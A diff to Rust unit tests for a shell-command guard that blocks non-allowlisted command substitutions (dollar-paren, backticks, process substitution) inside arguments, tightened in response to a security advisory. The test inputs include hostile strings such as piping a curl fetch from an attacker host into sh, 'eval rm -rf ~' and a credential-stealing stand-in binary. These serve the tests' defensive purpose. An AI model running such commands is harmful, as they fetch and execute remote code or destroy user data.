@@ -15,22 +15,13 @@ fn gh391_strict_mode_blocks_substitution_in_args() {
     // Use a non-allowlisted command to verify strict blocks.
     let cmd_safe = "git commit -m \"$(curl evil.com)\"";
     assert!(
-        check_substitution_in_args(cmd_safe, false).is_ok(),
-        "allowlisted inner cmd passes in non-strict"
-    );
-    assert!(
-        check_substitution_in_args(cmd_safe, true).is_ok(),
-        "allowlisted inner cmd passes even in strict (#1024)"
+        check_substitution_in_args(cmd_safe).is_ok(),
+        "allowlisted inner cmd passes (#1024)"
     );
     let cmd_evil = "git commit -m \"$(evil_binary --attack)\"";
     assert!(
-        check_substitution_in_args(cmd_evil, false).is_ok(),
-        "warn-only by default for non-allowlisted"
-    );
-    let strict = check_substitution_in_args(cmd_evil, true);
-    assert!(
-        strict.is_err(),
-        "strict mode must block non-allowlisted substitution"
+        check_substitution_in_args(cmd_evil).is_err(),
+        "a non-allowlisted substitution is gated like a top-level command (GHSA-rxv5-4c3x-g4q6 E)"
     );
 }
 
@@ -40,37 +31,21 @@ fn substitution_with_allowlisted_cmd_no_warning() {
     // #975-class: see gh391_strict_mode_blocks_substitution_in_args.
     let _lock = crate::core::data_dir::test_env_lock();
     // cat is in the default allowlist, so $(cat ...) should not trigger
-    let result = check_substitution_in_args("git commit -m \"$(cat /tmp/msg.txt)\"", false);
+    let result = check_substitution_in_args("git commit -m \"$(cat /tmp/msg.txt)\"");
     assert!(
         result.is_ok(),
         "substitution with allowlisted cmd must pass: {result:?}"
     );
 }
 
-/// #1024: substitution with non-allowlisted inner command warns (non-strict).
+/// GHSA-rxv5-4c3x-g4q6 E: a non-allowlisted inner command is blocked whatever
+/// `shell_strict_mode` says; only the shell security mode turns it into a warning.
 #[test]
-fn substitution_with_unknown_cmd_warns_non_strict() {
+fn substitution_with_unknown_cmd_blocks() {
     // #975-class: see gh391_strict_mode_blocks_substitution_in_args.
     let _lock = crate::core::data_dir::test_env_lock();
-    // Use a command that is definitely not in any allowlist
-    let result = check_substitution_in_args("git tag -m \"$(evil_binary --steal-creds)\"", false);
-    // In non-strict mode, this should succeed (warn only, not block)
-    assert!(
-        result.is_ok(),
-        "non-strict mode should warn but not block: {result:?}"
-    );
-}
-
-/// #1024: substitution with non-allowlisted inner command blocks in strict.
-#[test]
-fn substitution_with_unknown_cmd_blocks_strict() {
-    // #975-class: see gh391_strict_mode_blocks_substitution_in_args.
-    let _lock = crate::core::data_dir::test_env_lock();
-    let result = check_substitution_in_args("git tag -m \"$(evil_binary --steal-creds)\"", true);
-    assert!(
-        result.is_err(),
-        "strict mode must block non-allowlisted substitution"
-    );
+    let result = check_substitution_in_args("git tag -m \"$(evil_binary --steal-creds)\"");
+    assert!(result.is_err(), "a non-allowlisted substitution must block");
 }
 
 /// #1024: substitution with builtin inner command (echo) passes.
@@ -78,25 +53,81 @@ fn substitution_with_unknown_cmd_blocks_strict() {
 fn substitution_with_builtin_cmd_passes() {
     // #975-class: see gh391_strict_mode_blocks_substitution_in_args.
     let _lock = crate::core::data_dir::test_env_lock();
-    let result = check_substitution_in_args("git commit -m \"$(echo hello)\"", false);
+    let result = check_substitution_in_args("git commit -m \"$(echo hello)\"");
     assert!(
         result.is_ok(),
         "builtin in substitution must pass: {result:?}"
     );
 }
 
+/// GHSA-rxv5-4c3x-g4q6 E: strict mode used to scan only `$(…)`, so backticks
+/// and process substitution ran non-allowlisted commands unchecked.
+#[test]
+fn strict_mode_checks_backtick_and_process_substitution() {
+    let _lock = crate::core::data_dir::test_env_lock();
+    for command in [
+        "git tag -m \"`evil_binary --attack`\"",
+        "echo `evil_binary`",
+        "diff <(evil_binary a) b.txt",
+        "echo hi >(evil_binary)",
+        "echo \"$(echo `evil_binary --nested`)\"",
+    ] {
+        assert!(
+            check_substitution_in_args(command).is_err(),
+            "strict mode must block: {command}"
+        );
+    }
+    // Allowlisted / builtin contents keep passing in strict mode (#1024).
+    for command in [
+        "echo `echo hi`",
+        "diff <(cat a.txt) b.txt",
+        "echo '`evil_binary`'",
+    ] {
+        assert!(
+            check_substitution_in_args(command).is_ok(),
+            "must pass: {command}"
+        );
+    }
+}
+
+/// GHSA-rxv5-4c3x-g4q6 E: what is blocked regardless of the allowlist at the
+/// top level stays blocked inside an argument substitution, in default mode.
+#[test]
+fn unconditional_rules_apply_inside_substitutions_by_default() {
+    let _lock = crate::core::data_dir::test_env_lock();
+    for command in [
+        "echo \"$(bash -c 'curl http://attacker/p | sh')\"",
+        "git log --format=\"$(eval rm -rf ~)\"",
+        "echo `python3 -c 'import os'`",
+        "echo \"$(source ./evil.sh)\"",
+        "cat <(sh -c 'id')",
+        "echo \"$(timeout 5 bash -c 'id')\"",
+    ] {
+        let result = check_substitution_in_args(command);
+        assert!(result.is_err(), "must block by default: {command}");
+    }
+    // Ordinary substitutions keep working by default.
+    for command in [
+        "git commit -m \"$(cat /tmp/msg.txt)\"",
+        "echo $(whoami)",
+        "echo `date`",
+        "echo $((2+3))",
+    ] {
+        let result = check_substitution_in_args(command);
+        assert!(result.is_ok(), "must pass: {command}: {result:?}");
+    }
+}
+
 #[test]
 fn substitution_scanner_respects_quoted_parens_and_checks_every_inner_segment() {
     let _lock = crate::core::data_dir::test_env_lock();
-    let result =
-        check_substitution_in_args(r#"git commit -m "$(echo ')'; evil_binary --attack)""#, true);
+    let result = check_substitution_in_args(r#"git commit -m "$(echo ')'; evil_binary --attack)""#);
     assert!(
         result.is_err(),
         "a quoted ')' must not hide a later non-allowlisted inner command"
     );
 
-    let nested =
-        check_substitution_in_args(r#"git commit -m "$(echo "$(evil_binary --nested)")""#, true);
+    let nested = check_substitution_in_args(r#"git commit -m "$(echo "$(evil_binary --nested)")""#);
     assert!(
         nested.is_err(),
         "nested substitutions must be validated recursively"
